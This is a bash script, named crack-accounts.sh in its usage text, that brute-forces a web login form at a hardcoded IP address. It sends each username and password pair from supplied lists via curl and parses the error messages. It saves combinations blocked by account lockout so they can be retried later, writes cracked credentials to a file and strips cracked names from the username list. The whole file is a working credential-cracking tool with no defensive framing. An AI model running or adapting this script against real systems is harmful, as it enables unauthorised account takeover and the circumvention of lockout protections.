#######CONSTANTS#######
INVALID_USERNAME="Error. Username does not exist."
LOCKED_ACCOUNT="You have exceeded 4 failed logins. Account locked."
INVALID_PASSWORD="Invalid password"

OUTPUT_FILE="username-passwords.txt"
MISSED_USER_PASSWORDS="missed-user-pass.txt"
SEPERATOR="~"

RE_ATTEMPT_REGEX="(.?)$SEPERATOR(.*)"

#######END CONSTANTS#######


declare -a missed_usernames
declare -a missed_passwords

#when user-password combination fails due to a locked account, 
#we store the combination in a file so it can be re-attempted later
re_attempt_failed_passwords(){
	#if the file does not exist, make it
	>>"${MISSED_USER_PASSWORDS}"

	#loop through file containing previously failed attempts
	while IFS= read -r line; do
		#parse user and password from file using regex
		if [[ "${line}" =~ $RE_ATTEMPT_REGEX ]]; then
			guess_user_pass "${BASH_REMATCH[1]}" "${BASH_REMATCH[2]}"		
		fi

	done < "${MISSED_USER_PASSWORDS}"

	#clear out the old textfile
	>"${MISSED_USER_PASSWORDS}" 

	#re-insert any combinations that are still locked into the file
	for index in "${!missed_usernames[@]}"; do
		echo "${missed_usernames[index]}${SEPERATOR}${missed_passwords[index]}" >> "${MISSED_USER_PASSWORDS}"
	done
	exit 0
}


guess_user_pass(){
	username=$1
	password=$2
	
	#send HTTP request
	response="$(curl -X POST http://142.1.44.135:8000/login -d "username=${username}" -d "password=${password}")"
	
	#capture the exit status of the curl command (in case of internet disconnect and other unexpected situations)
	curl_success=$? 

	if [[ "${response}" =~ "${LOCKED_ACCOUNT}" ]]; then
		#account is locked, store user/pass combo to guess later
		missed_usernames+=("${username}")
		missed_passwords+=("${password}")
		return 2	
	elif [[ ! "${response}" =~ "${INVALID_USERNAME}"|"${INVALID_PASSWORD}" ]] && [ $curl_success ]; then
		#successful guess, record result
		echo "${username};${password}" >> "${OUTPUT_FILE}"
		return 0
	fi
	return 1
}

while getopts 'ru:p:' flag; do
  case "${flag}" in
    r) re_attempt_failed_passwords
	exit 0;;
    u) usernames=${OPTARG};;
    p) passwords=${OPTARG};;
  esac
done

#if the user did not specify both a username list and password list, print usages and exit
if [ ! "${usernames}" ] || [ ! "${passwords}" ]; then
	echo "Usages:"
	echo "crack-accounts.sh -r : retry attempts that failed due to lockout"
	echo "crack-accounts.sh [-u username list] [-p password list] : attempt to crack usernames using specified passwords"
	exit 1
fi

#read usernames file into an array
readarray -t username_array < "${usernames}"

#for each password, loop through username list and attempt the combination
while IFS= read -r password; do
 	for index in "${!username_array[@]}"; do
		guess_user_pass "${username_array[index]}" "${password}"
		if [ $? == 0 ]; then
			#if we found a password, stop attempting other combinations for that username
			unset username_array[index]
		fi
	done
done < "${passwords}"

#re-try failures due to locked account
for index in "${!missed_usernames[@]}"; do
	guess_user_pass "${missed_usernames[index]}" "${missed_passwords[index]}"
	if [ $? == 2 ]; then
		#account is still locked, store in a file so that it can be retried later (with -r flag)
		echo "${missed_usernames[index]}${SEPERATOR}${missed_passwords[index]}" >> "${MISSED_USER_PASSWORDS}"
	fi
done

#empty username list
>"${usernames}"

#re-write any usernames that we still havent cracked into usernamelist
for index in "${!username_array[@]}"; do
	echo "${username_array[index]}" >> "${usernames}"
done


